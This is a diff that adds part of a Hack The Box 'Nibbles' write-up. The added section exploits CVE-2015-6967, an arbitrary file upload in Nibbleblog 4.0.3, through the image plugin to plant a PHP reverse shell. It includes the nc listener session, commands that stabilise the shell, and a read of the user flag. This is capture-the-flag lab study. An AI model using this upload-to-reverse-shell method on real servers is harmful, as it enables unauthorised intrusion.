@@ -187,6 +187,46 @@ if __name__ == '__main__':
 	run(args.w, args.u, args.p)
 ```
 
+Researching on nibbleblog, we realize that nibblieblog 4.0.3 is vulnerable to CVE-2015-6967. THis allows any authenticated user to upload arbitary files and spawn a reverse shell. However, the exploit on exploitdb [here](https://www.exploit-db.com/exploits/38489) only uses matasploit. Using the tutorial from [here](https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/), we will try to craft our own payload.
+
+But first, we have to make sure that our image plugin is activated.
+
+![Image plugins](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nibbles/plugins.PNG)
+
+Next, let's try to upload a test file via http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image. We noticed that even though the file upload displays a warning message, the file will still be successfull uploaded, and can be viewed via http://nibbles.htb/content/private/plugins/my_image.
+
+![Uploaded files](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nibbles/uploaded_files.PNG)
+
 ## Obtaining user flag
 
+Now, we will upload a php reverse shell, downloaded from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell) on the website and accessing the uploaded file will grant us a reverse shell. But, first let's stabilize the reverse shell
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4000           
+listening on [any] 4000 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.75] 44484
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 22:37:17 up 20:07,  0 users,  load average: 0.01, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+nibbler@Nibbles:/$ export TERM=xterm
+export TERM=xterm
+nibbler@Nibbles:/$ stty cols 132 rows 34
+stty cols 132 rows 34
+nibbler@Nibbles:/$
+```
+
+Now, all we have to do is to obtain the user flag.
+
+```
+nibbler@Nibbles:/home$ cd /home/nibbler
+cd /home/nibbler
+nibbler@Nibbles:/home/nibbler$ cat user.txt
+cat user.txt
+<Redacted user flag>
+nibbler@Nibbles:/home/nibbler$ 
+```
 ## Obtaining root flag
